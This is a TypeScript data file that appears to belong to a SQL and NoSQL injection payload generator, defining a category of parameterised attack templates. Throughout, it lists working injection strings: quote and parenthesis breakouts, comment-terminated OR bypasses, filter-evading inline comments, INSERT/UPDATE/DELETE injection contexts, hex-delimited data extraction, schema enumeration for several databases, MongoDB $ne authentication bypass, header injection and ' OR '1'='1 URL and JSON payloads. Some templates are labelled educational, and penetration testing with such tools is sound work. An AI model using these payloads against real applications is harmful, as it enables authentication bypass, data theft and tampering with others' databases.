import { TemplateCategory } from '../../types/template';

export const customBasedCategory: TemplateCategory = {
  id: 'custom-based',
  label: 'Custom Based',
  description: 'Custom injection wrappers, non-standard database dialects, DML contexts, and user snippet slots',
  iconName: 'Code',
  subcategories: [
    // ========================================================================
    // A. INJECTION CONTEXT WRAPPERS
    // ========================================================================
    {
      id: 'context-wrappers',
      label: 'Context Wrappers',
      description: 'Syntax wrappers for adapting queries to specific input boundaries and enclosure contexts',
      templates: [
        {
          id: 'wrapper-single-quote',
          name: 'Single-Quote String Context',
          description: 'Encloses a custom condition within single-quoted SQL string boundaries',
          content: "' AND ({custom_condition}) AND '1'='1",
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom SQL Condition',
              defaultValue: 'SELECT 1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-double-quote',
          name: 'Double-Quote String Context',
          description: 'Encloses a custom condition within double-quoted SQL string boundaries',
          content: '" AND ({custom_condition}) AND "1"="1',
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom SQL Condition',
              defaultValue: 'SELECT 1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-quote-parenthesis',
          name: 'Single-Quote with Parenthesis Context',
          description: 'Encloses a condition where the input is nested inside single quotes and parentheses',
          content: "') AND ({custom_condition}) AND ('1'='1",
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom SQL Condition',
              defaultValue: 'SELECT 1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-double-quote-parenthesis',
          name: 'Double-Quote with Parenthesis Context',
          description: 'Encloses a condition where the input is nested inside double quotes and parentheses',
          content: '") AND ({custom_condition}) AND ("1"="1',
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom SQL Condition',
              defaultValue: 'SELECT 1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-numeric-int',
          name: 'Numeric / Integer Context',
          description: 'Injects into numeric contexts without quotes by prepending an OR condition',
          content: '-1 OR ({custom_condition})',
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom Condition Expression',
              defaultValue: '1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-comment-terminated',
          name: 'Comment Terminated Single-Quote',
          description: 'Breaks out of string enclosure and suppresses remaining SQL syntax using dash comment',
          content: "' OR ({custom_condition})-- -",
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom Condition Expression',
              defaultValue: '1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-inline-comment',
          name: 'Inline Block-Comment Wrapper',
          description: 'Uses inline C-style block comments to separate tokens and avoid whitespace filtering',
          content: '/**/AND/**/({custom_condition})/**/',
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom Condition',
              defaultValue: '1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'wrapper-order-by-case',
          name: 'ORDER BY Conditional Context',
          description: 'Conditional evaluation template designed for ORDER BY and clause sorting injection',
          content: 'ORDER BY (CASE WHEN ({custom_condition}) THEN 1 ELSE 2 END)',
          parameters: [
            {
              id: 'custom_condition',
              label: 'Evaluation Condition',
              defaultValue: '1=1',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // B. CUSTOM SEPARATORS & CONCATENATION
    // ========================================================================
    {
      id: 'custom-separators',
      label: 'Separators & Concat',
      description: 'Educational concatenation formatting with custom delimiters, hex markers, and multi-field joins',
      templates: [
        {
          id: 'concat-tilde-delimiter',
          name: 'Tilde Delimiter Wrapper (~)',
          description: 'Wraps an extracted expression with recognizable tilde markers in hexadecimal (0x7e)',
          content: 'CONCAT(0x7e, ({custom_expression}), 0x7e)',
          parameters: [
            {
              id: 'custom_expression',
              label: 'Target SQL Expression',
              defaultValue: 'SELECT database()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'concat-colon-separator',
          name: 'Colon Separator Multi-Field (CONCAT_WS)',
          description: 'Combines two fields separated by a colon using CONCAT_WS and hex delimiter (0x3a)',
          content: 'CONCAT_WS(0x3a, {field1}, {field2})',
          parameters: [
            {
              id: 'field1',
              label: 'First Field Expression',
              defaultValue: 'user()',
              inputType: 'text'
            },
            {
              id: 'field2',
              label: 'Second Field Expression',
              defaultValue: 'version()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'concat-pipe-separator',
          name: 'Pipe Delimiter Format (|)',
          description: 'Combines fields separated by a vertical pipe delimiter (0x7c)',
          content: 'CONCAT_WS(0x7c, {field1}, {field2})',
          parameters: [
            {
              id: 'field1',
              label: 'First Field',
              defaultValue: 'user()',
              inputType: 'text'
            },
            {
              id: 'field2',
              label: 'Second Field',
              defaultValue: 'database()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'concat-html-break',
          name: 'HTML Break Delimiter (GROUP_CONCAT)',
          description: 'Aggregates multiple rows separated by HTML line breaks (0x3c62723e)',
          content: 'GROUP_CONCAT({column_name} SEPARATOR 0x3c62723e)',
          parameters: [
            {
              id: 'column_name',
              label: 'Target Column Name',
              defaultValue: 'schema_name',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'concat-custom-hex-markers',
          name: 'Custom Hex Boundary Delimiters',
          description: 'Surrounds extracted data with configurable hex boundaries for regex extraction',
          content: 'CONCAT({hex_prefix}, ({custom_expression}), {hex_suffix})',
          parameters: [
            {
              id: 'hex_prefix',
              label: 'Prefix Hex Code',
              defaultValue: '0x212121',
              inputType: 'text'
            },
            {
              id: 'custom_expression',
              label: 'Target SQL Expression',
              defaultValue: 'SELECT version()',
              inputType: 'text'
            },
            {
              id: 'hex_suffix',
              label: 'Suffix Hex Code',
              defaultValue: '0x212121',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'concat-mssql-xml-path',
          name: 'MSSQL XML PATH Aggregation',
          description: 'Educational MSSQL multi-row string aggregation using FOR XML PATH',
          content: "(SELECT {column_name} + ',' FROM {table_name} FOR XML PATH(''))",
          parameters: [
            {
              id: 'column_name',
              label: 'Column Name',
              defaultValue: 'name',
              inputType: 'text'
            },
            {
              id: 'table_name',
              label: 'Table Name',
              defaultValue: 'sys.databases',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // C. DML CONTEXTS (INSERT / UPDATE / DELETE)
    // ========================================================================
    {
      id: 'dml-contexts',
      label: 'DML Contexts',
      description: 'Educational syntax for testing SQL injection in INSERT, UPDATE, and DELETE queries',
      templates: [
        {
          id: 'dml-insert-subquery',
          name: 'INSERT Values Subquery Context',
          description: 'Injects a subquery within an INSERT statement value list',
          content: "admin', ({custom_subquery}), 'active_user",
          parameters: [
            {
              id: 'custom_subquery',
              label: 'Subquery Expression',
              defaultValue: 'SELECT database()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dml-insert-multi-row',
          name: 'INSERT Multi-Row Values Appending',
          description: 'Appends a second row tuple into an INSERT VALUES statement',
          content: "1, 'marker_value'), (2, ({custom_subquery})",
          parameters: [
            {
              id: 'custom_subquery',
              label: 'Subquery Expression',
              defaultValue: 'SELECT version()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dml-update-set-column',
          name: 'UPDATE SET Column Subquery',
          description: 'Modifies additional columns via subquery during an UPDATE statement',
          content: "name='user', role=({custom_subquery}) WHERE id={target_id}",
          parameters: [
            {
              id: 'custom_subquery',
              label: 'Subquery Expression',
              defaultValue: 'SELECT database()',
              inputType: 'text'
            },
            {
              id: 'target_id',
              label: 'Target Record ID',
              defaultValue: '1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dml-update-where-condition',
          name: 'UPDATE WHERE Conditional Subquery',
          description: 'Appends a subquery condition into the WHERE clause of an UPDATE statement',
          content: "WHERE id={target_id} AND ({custom_condition})",
          parameters: [
            {
              id: 'target_id',
              label: 'Target Record ID',
              defaultValue: '1',
              inputType: 'text'
            },
            {
              id: 'custom_condition',
              label: 'Evaluation Condition',
              defaultValue: 'SELECT 1=1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dml-delete-where-condition',
          name: 'DELETE WHERE Subquery Enclosure',
          description: 'Attaches an evaluation subquery to the WHERE filter of a DELETE statement',
          content: "id={target_id} OR ({custom_condition})",
          parameters: [
            {
              id: 'target_id',
              label: 'Target Record ID',
              defaultValue: '1',
              inputType: 'text'
            },
            {
              id: 'custom_condition',
              label: 'Evaluation Condition',
              defaultValue: '1=2',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // D. MULTI-DATABASE DIALECTS (NON-STANDARD)
    // ========================================================================
    {
      id: 'multi-db-dialects',
      label: 'Multi-DB Dialects',
      description: 'Educational syntax templates for SQLite, Oracle, PostgreSQL, and non-MySQL systems',
      templates: [
        {
          id: 'dialect-sqlite-master',
          name: 'SQLite Table Schema (sqlite_master)',
          description: 'Retrieves SQL creation statement for a table from sqlite_master',
          content: "SELECT sql FROM sqlite_master WHERE type='table' AND name='{table_name}'",
          parameters: [
            {
              id: 'table_name',
              label: 'Target Table Name',
              defaultValue: 'users',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dialect-sqlite-list-tables',
          name: 'SQLite List All Tables',
          description: 'Aggregates all user-defined table names in an SQLite database',
          content: "SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%'",
          parameters: []
        },
        {
          id: 'dialect-sqlite-version',
          name: 'SQLite Version Information',
          description: 'Returns the current SQLite engine version string',
          content: 'SELECT sqlite_version()',
          parameters: []
        },
        {
          id: 'dialect-oracle-version',
          name: 'Oracle Version Query (v$version)',
          description: 'Retrieves Oracle database version banner using the dual table',
          content: 'SELECT banner FROM v$version WHERE ROWNUM=1',
          parameters: []
        },
        {
          id: 'dialect-oracle-list-tables',
          name: 'Oracle List Tables (all_tables)',
          description: 'Queries user table names from all_tables restricted by ROWNUM',
          content: 'SELECT table_name FROM all_tables WHERE ROWNUM<={row_limit}',
          parameters: [
            {
              id: 'row_limit',
              label: 'Row Limit',
              defaultValue: '10',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dialect-postgres-cast-text',
          name: 'PostgreSQL Explicit Text Cast (::text)',
          description: 'Demonstrates explicit type casting syntax in PostgreSQL',
          content: 'CAST({custom_expression} AS TEXT)',
          parameters: [
            {
              id: 'custom_expression',
              label: 'Expression to Cast',
              defaultValue: 'version()',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'dialect-postgres-context',
          name: 'PostgreSQL Current User & Database',
          description: 'Retrieves current active user and database name in PostgreSQL',
          content: "SELECT current_user || ' - ' || current_database()",
          parameters: []
        }
      ]
    },

    // ========================================================================
    // E. NOSQL & API CONTEXTS (JSON / GRAPHQL)
    // ========================================================================
    {
      id: 'nosql-api-contexts',
      label: 'NoSQL & API Contexts',
      description: 'Educational payload templates for MongoDB NoSQL operators, GraphQL queries, and header fields',
      templates: [
        {
          id: 'nosql-mongo-ne-operator',
          name: 'MongoDB Not-Equal ($ne) Operator',
          description: 'Standard NoSQL authentication bypass pattern using MongoDB $ne comparison operator',
          content: '{"$ne": null}',
          parameters: []
        },
        {
          id: 'nosql-mongo-gt-operator',
          name: 'MongoDB Greater-Than ($gt) Operator',
          description: 'MongoDB $gt comparison query template for non-empty string matches',
          content: '{"$gt": ""}',
          parameters: []
        },
        {
          id: 'nosql-mongo-regex-pattern',
          name: 'MongoDB Regex ($regex) Match',
          description: 'Pattern matching query using MongoDB regular expression operator',
          content: '{"$regex": "{pattern}"}',
          parameters: [
            {
              id: 'pattern',
              label: 'Regex Search Pattern',
              defaultValue: '^adm.*',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'nosql-mongo-where-eval',
          name: 'MongoDB Where Evaluation ($where)',
          description: 'JavaScript condition evaluation template within MongoDB query object',
          content: '{"$where": "{js_condition}"}',
          parameters: [
            {
              id: 'js_condition',
              label: 'JavaScript Evaluation Expression',
              defaultValue: 'this.status == 1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'api-graphql-introspection',
          name: 'GraphQL Schema Introspection Skeleton',
          description: 'Standard GraphQL schema introspection query for discovering available types',
          content: '{"query": "{ __schema { types { name kind description } } }"}',
          parameters: []
        },
        {
          id: 'api-custom-header-wrapper',
          name: 'Custom Header Injection Wrapper',
          description: 'HTTP header payload placeholder for testing X-Forwarded-For and custom client headers',
          content: "X-Forwarded-For: 127.0.0.1' AND ({custom_condition})-- -",
          parameters: [
            {
              id: 'custom_condition',
              label: 'Custom SQL Condition',
              defaultValue: '1=1',
              inputType: 'text'
            }
          ]
        }
      ]
    },

    // ========================================================================
    // F. USER CUSTOM SLOTS (CUSTOM SNIPPETS)
    // ========================================================================
    {
      id: 'custom-slots',
      label: 'Custom Snippets',
      description: 'Reusable user-defined custom snippet slots for storing and quickly inserting custom queries',
      templates: [
        {
          id: 'slot-custom-query-1',
          name: 'Custom Query Slot 1',
          description: 'User configurable SQL template slot 1',
          content: '{custom_query}',
          parameters: [
            {
              id: 'custom_query',
              label: 'Custom SQL Query / Expression',
              defaultValue: 'SELECT 1, 2, 3',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'slot-custom-query-2',
          name: 'Custom Query Slot 2',
          description: 'User configurable SQL template slot 2',
          content: '{custom_query}',
          parameters: [
            {
              id: 'custom_query',
              label: 'Custom SQL Query / Expression',
              defaultValue: 'SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'slot-custom-query-3',
          name: 'Custom Query Slot 3',
          description: 'User configurable SQL template slot 3',
          content: '{custom_query}',
          parameters: [
            {
              id: 'custom_query',
              label: 'Custom SQL Query / Expression',
              defaultValue: 'SELECT column_name FROM information_schema.columns WHERE table_name="{table_name}" LIMIT 1',
              inputType: 'text'
            },
            {
              id: 'table_name',
              label: 'Target Table Name',
              defaultValue: 'users',
              inputType: 'text'
            }
          ]
        },
        {
          id: 'slot-parameterized-url',
          name: 'Parameterized Request Template',
          description: 'Generic parameterized query string template for URL testing',
          content: '{base_url}?{param_name}={param_value}',
          parameters: [
            {
              id: 'base_url',
              label: 'Target Base URL',
              defaultValue: 'http://example-vuln.com/api/search',
              inputType: 'text'
            },
            {
              id: 'param_name',
              label: 'Parameter Name',
              defaultValue: 'id',
              inputType: 'text'
            },
            {
              id: 'param_value',
              label: 'Parameter Value',
              defaultValue: "1' OR '1'='1",
              inputType: 'text'
            }
          ]
        },
        {
          id: 'slot-json-request-body',
          name: 'Custom JSON Request Skeleton',
          description: 'Structured JSON object placeholder for testing REST API body payloads',
          content: '{\n  "action": "{action_name}",\n  "target": "{target_id}",\n  "filter": "{filter_query}"\n}',
          parameters: [
            {
              id: 'action_name',
              label: 'Action Name',
              defaultValue: 'query',
              inputType: 'text'
            },
            {
              id: 'target_id',
              label: 'Target Identifier',
              defaultValue: '1',
              inputType: 'text'
            },
            {
              id: 'filter_query',
              label: 'Filter Payload Expression',
              defaultValue: "admin' OR 1=1-- -",
              inputType: 'text'
            }
          ]
        }
      ]
    }
  ]
};
